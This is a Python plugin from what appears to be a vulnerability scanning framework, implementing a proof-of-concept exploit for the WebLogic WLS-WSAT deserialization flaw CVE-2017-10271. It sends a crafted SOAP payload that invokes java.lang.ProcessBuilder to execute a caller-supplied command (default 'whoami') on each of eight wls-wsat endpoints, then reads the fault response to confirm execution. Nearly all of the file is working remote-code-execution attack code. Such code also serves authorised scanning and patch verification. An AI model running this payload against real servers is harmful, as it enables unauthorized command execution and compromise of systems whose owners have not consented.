#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2017-10271，漏洞 CVE-2017-3506 的绕过版本，所以删除 CVE-2017-3506 检测 POC
# updated 2019/10/23
#

import pathlib
import re
import sys
from typing import Any, Tuple

try:
    from utils import PLUGIN_TYPE, plugin, urlutil
except:
    sys.path.append(pathlib.Path(__file__).parent.parent.__str__())
    from utils import PLUGIN_TYPE, plugin, urlutil


class Plugin(plugin.PluginBase):
    def set_info(self):
        return {
            'name': 'Weblogic WLS-WSAT Component Deserialization',
            'catalog': 'CVE-2017-10271',
            'itype': PLUGIN_TYPE.POC,
            'protocols': ['http', 'https'],
            'port': '7001',
        }

    def run(self, url: urlutil.Url, cmd: str = 'whoami', *args, **kwargs) -> Tuple[bool, Any]:
        paths = [
            '/wls-wsat/CoordinatorPortType',
            '/wls-wsat/CoordinatorPortType11',
            '/wls-wsat/ParticipantPortType',
            '/wls-wsat/ParticipantPortType11',
            '/wls-wsat/RegistrationPortTypeRPC',
            '/wls-wsat/RegistrationPortTypeRPC11',
            '/wls-wsat/RegistrationRequesterPortType',
            '/wls-wsat/RegistrationRequesterPortType11',
        ]
        pl_string = ''
        for index, it in enumerate(cmd.split()):
            pl_string += '<void index="{}"><string>{}</string></void>'.format(index, it)
        data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="{}">{}</array>
          <void method="start" />
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body />
</soapenv:Envelope>'''.format(
            len(cmd.split()), pl_string
        )

        headers = {'Content-Type': 'text/xml'}
        err = None
        for path in paths:
            err, response = self.http.rq(url.join(path).get_full(), 'POST', data=data, headers=headers, timeout=5)
            if err:
                continue
            r_response = re.search(
                '(<faultstring>java.lang.ProcessBuilder.*?<.*?>|<faultstring>0.*?<.*?>)', response.text
            )
            if r_response:
                return True, r_response.group(0).strip()
        return False, err


if __name__ == '__main__':
    import time

    from utils import net_echo

    nc = net_echo.DnslogCn()
    nc.start_service()
    plugin = Plugin(nc)

    s_time = time.time()
    ret = plugin.do_testing('192.168.245.128')
    print(ret)
    print(ret['is_exists'])
    print('total time(s):', time.time() - s_time)
